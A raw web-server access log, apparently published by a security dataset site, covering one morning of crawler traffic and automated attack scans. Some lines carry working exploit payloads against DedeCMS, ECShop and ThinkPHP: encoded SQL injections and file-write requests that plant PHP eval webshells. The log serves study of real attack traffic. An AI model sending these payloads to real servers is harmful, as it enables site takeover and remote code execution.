47.99.109.174 - - [10/Aug/2019:01:48:22 -0700] "GET /config/ueditor/net/controller.ashx HTTP/1.1" 404 294 "http://www.secrepo.com/config/ueditor/net/controller.ashx" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)" 
178.137.16.246 - - [10/Aug/2019:04:18:06 -0700] "GET / HTTP/1.1" 200 46561 "https://mydirtystuff.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
178.137.16.246 - - [10/Aug/2019:04:18:07 -0700] "GET / HTTP/1.1" 200 46561 "https://mydirtystuff.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
178.137.16.246 - - [10/Aug/2019:04:18:08 -0700] "GET / HTTP/1.1" 200 46561 "https://mydirtystuff.com/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; MRA 4.6 (build 01425); .NET CLR 1.1.4322; .NET CLR 2.0.50727)" 
113.171.224.176 - - [10/Aug/2019:04:29:24 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
178.216.48.242 - - [10/Aug/2019:04:58:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279403 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3428.0 Safari/537.36" 
34.66.152.224 - - [10/Aug/2019:05:22:06 -0700] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
34.66.152.224 - - [10/Aug/2019:05:22:06 -0700] "GET / HTTP/1.0" 200 46568 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
206.47.249.246 - - [10/Aug/2019:05:32:34 -0700] "GET /self.logs/error.log.2019-04-23.gz HTTP/1.1" 304 175 "-" "Mozilla/4.0 (compatible;)" 
100.43.90.103 - - [10/Aug/2019:05:34:39 -0700] "GET /robots.txt HTTP/1.1" 200 288 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
100.43.90.103 - - [10/Aug/2019:05:34:43 -0700] "GET /self.logs/2015/?C=S;O=A HTTP/1.1" 200 8209 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
113.171.224.176 - - [10/Aug/2019:05:37:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
113.171.224.176 - - [10/Aug/2019:05:38:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
181.215.75.190 - - [10/Aug/2019:05:47:48 -0700] "GET / HTTP/1.1" 301 475 "-" "Go-http-client/1.1" 
181.215.75.190 - - [10/Aug/2019:05:47:48 -0700] "GET / HTTP/1.1" 200 12431 "-" "Go-http-client/1.1" 
100.43.90.103 - - [10/Aug/2019:05:55:01 -0700] "GET /self.logs/access.log.2019-07-15 HTTP/1.1" 200 197400 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" 
64.233.172.167 - - [10/Aug/2019:06:03:17 -0700] "GET / HTTP/1.1" 200 12432 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
64.233.172.160 - - [10/Aug/2019:06:03:17 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 624 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
207.46.13.123 - - [10/Aug/2019:06:05:38 -0700] "GET /self.logs/access.log.2018-01-10.gz HTTP/1.1" 200 21179 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
95.163.255.167 - - [10/Aug/2019:06:08:47 -0700] "GET /robots.txt HTTP/1.0" 200 251 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
95.163.255.152 - - [10/Aug/2019:06:08:49 -0700] "GET /Datasets%20Description/Network/notice.html HTTP/1.1" 200 1534 "-" "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/2.0; +http://go.mail.ru/help/robots)" 
123.133.163.17 - - [10/Aug/2019:06:18:13 -0700] "HEAD / HTTP/1.1" 200 317 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:13 -0700] "HEAD //plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 404 0 "http://www.secrepo.com//plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:14 -0700] "GET //plus/moon.php HTTP/1.1" 404 250 "http://www.secrepo.com//plus/moon.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:14 -0700] "GET //data/mysql_error_trace.inc HTTP/1.1" 404 216 "http://www.secrepo.com//data/mysql_error_trace.inc" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:14 -0700] "HEAD //plus/mytag_js.php?dopost=saveedit&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=116&arrs2%5B%5D=97&arrs2%5B%5D=103&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=40&arrs2%5B%5D=97&arrs2%5B%5D=105&arrs2%5B%5D=100&arrs2%5B%5D=44&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=41&arrs2%5B%5D=32&arrs2%5B%5D=86&arrs2%5B%5D=65&arrs2%5B%5D=76&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=40&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=57&arrs2%5B%5D=48&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=104&arrs2%5B%5D=111&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=100&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=109&arrs2%5B%5D=115&arrs2%5B%5D=32&arrs2%5B%5D=53&arrs2%5B%5D=46&arrs2%5B%5D=55&arrs2%5B%5D=32&arrs2%5B%5D=48&arrs2%5B%5D=100&arrs2%5B%5D=97&arrs2%5B%5D=121&arrs2%5B%5D=60&arrs2%5B%5D=98&arrs2%5B%5D=114&arrs2%5B%5D=62&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=44& HTTP/1.1" 404 197 "http://www.secrepo.com//plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:15 -0700] "HEAD //data/mysql_error_trace.inc HTTP/1.1" 404 197 "http://www.secrepo.com//data/mysql_error_trace.inc" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:15 -0700] "HEAD //plus/recommend.php HTTP/1.1" 404 197 "http://www.secrepo.com//plus/recommend.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:15 -0700] "GET //plus/search.php?keyword=test&typeArr%5B%20uNion%20%5D=a HTTP/1.1" 404 216 "http://www.secrepo.com//plus/search.php?keyword=test&typeArr[%20uNion%20]=a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:15 -0700] "HEAD //images/swfupload/swfupload.swf HTTP/1.1" 404 197 "http://www.secrepo.com//images/swfupload/swfupload.swf" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:16 -0700] "GET //install/index.php.bak HTTP/1.1" 404 216 "http://www.secrepo.com//install/index.php.bak" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:16 -0700] "HEAD //plus/download.php HTTP/1.1" 404 197 "http://www.secrepo.com//plus/download.php" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:16 -0700] "HEAD //plus/search.php?keyword=as&typeArr%5B%20uNion%20%5D=a HTTP/1.1" 404 197 "http://www.secrepo.com//plus/search.php?keyword=as&typeArr[%20uNion%20]=a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
123.133.163.17 - - [10/Aug/2019:06:18:17 -0700] "HEAD //plus/search.php?keyword=as&typeArr%5B%20uNion%20%5D=a HTTP/1.1" 404 197 "http://www.secrepo.com//plus/search.php?keyword=as&typeArr[%20uNion%20]=a" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html" 
199.254.117.3 - - [10/Aug/2019:06:19:07 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
199.254.117.3 - - [10/Aug/2019:06:19:07 -0700] "GET /css/style.css HTTP/1.1" 404 294 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
199.254.117.3 - - [10/Aug/2019:06:19:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
199.254.117.3 - - [10/Aug/2019:06:19:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
199.254.117.3 - - [10/Aug/2019:06:19:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
113.171.224.176 - - [10/Aug/2019:06:48:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
34.66.152.224 - - [10/Aug/2019:06:50:42 -0700] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
34.66.152.224 - - [10/Aug/2019:06:50:43 -0700] "GET / HTTP/1.0" 200 46568 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
34.66.152.224 - - [10/Aug/2019:06:50:44 -0700] "GET / HTTP/1.0" 301 438 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
34.66.152.224 - - [10/Aug/2019:06:50:45 -0700] "GET / HTTP/1.0" 200 46568 "-" "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10" 
123.243.231.8 - - [10/Aug/2019:06:54:57 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
123.243.231.8 - - [10/Aug/2019:06:54:58 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
123.243.231.8 - - [10/Aug/2019:06:54:58 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
123.243.231.8 - - [10/Aug/2019:06:54:58 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
123.243.231.8 - - [10/Aug/2019:06:54:59 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
216.244.66.245 - - [10/Aug/2019:06:55:42 -0700] "GET /robots.txt HTTP/1.1" 200 244 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
67.11.199.106 - - [10/Aug/2019:06:56:57 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
67.11.199.106 - - [10/Aug/2019:06:56:57 -0700] "GET /css/style.css HTTP/1.1" 404 271 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
67.11.199.106 - - [10/Aug/2019:06:56:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7450 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
67.11.199.106 - - [10/Aug/2019:06:56:57 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27810 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
67.11.199.106 - - [10/Aug/2019:06:56:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 601 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0" 
159.69.181.170 - - [10/Aug/2019:06:59:59 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
88.198.111.31 - - [10/Aug/2019:06:59:59 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
88.198.111.31 - - [10/Aug/2019:07:00:01 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
159.69.181.170 - - [10/Aug/2019:07:00:01 -0700] "GET / HTTP/1.1" 200 12431 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
74.119.146.37 - - [10/Aug/2019:07:09:57 -0700] "GET / HTTP/1.1" 200 12431 "-" "Vienna/7074 (Macintosh; Intel macOS 10_13_6)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F HTTP/1.1" 404 294 "http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "GET /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1" 404 271 "http://www.secrepo.com/index.php?m=member&c=index&a=register&siteid=1" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 271 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "GET /plus/moon.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/moon.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /plus/90sec.php HTTP/1.1" 404 271 "http://www.secrepo.com/plus/90sec.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /utility/convert/index.php?a=config&source=d7.2_x2.0 HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/index.php?a=config&source=d7.2_x2.0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /utility/convert/data/config.inc.php HTTP/1.1" 404 271 "http://www.secrepo.com/utility/convert/data/config.inc.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=getfiles&refiles[0]=123&refiles[1]=\\%22;eval($_POST[ysy]);die();//" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /uploads/dede/sys_verifies.php?action=down HTTP/1.1" 404 271 "http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:45 -0700] "POST /index.php/api/Uploadify/preview HTTP/1.1" 404 271 "http://www.secrepo.com/index.php/api/Uploadify/preview" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:46 -0700] "GET /user.php?act=login HTTP/1.1" 404 271 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:288:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:46 -0700] "POST /fdgq.php HTTP/1.1" 404 271 "http://www.secrepo.com/fdgq.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:46 -0700] "GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=zqtod.php&content=%3C?php%20mb_ereg_replace('.*',@$_REQUEST%5B_%5D,%20'',%20'e');?%3E HTTP/1.1" 200 46582 "http://www.secrepo.com/?s=index/\\think\\template\\driver\\file/write&cacheFile=zqtod.php&content=<?php mb_ereg_replace('.*',@$_REQUEST[_], '', 'e');?>" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
134.73.7.114 - - [10/Aug/2019:07:11:46 -0700] "POST /zqtod.php HTTP/1.1" 404 271 "http://www.secrepo.com/zqtod.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
